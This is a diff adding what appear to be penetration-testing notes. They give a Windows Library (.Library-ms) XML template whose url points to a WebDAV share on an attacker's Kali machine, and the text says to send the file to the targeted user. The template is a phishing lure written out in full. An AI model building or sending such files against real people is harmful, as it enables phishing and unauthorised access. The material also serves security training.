@@ -1,0 +1,27 @@
+The following XML code is the template for our Windows Library file:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://<LOCALIP></url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+
+
+This Windows Library file is pinned to the Windows Explorer engine and would act as a open directory once open.
+The <url> tag ensure that the contents of the directory are those stored in the webDAV share hosted by our Kali machine.
+
+This XML code has to be pasted to a single file with the extension .Library-ms and this is the file that has to be sended to the user.
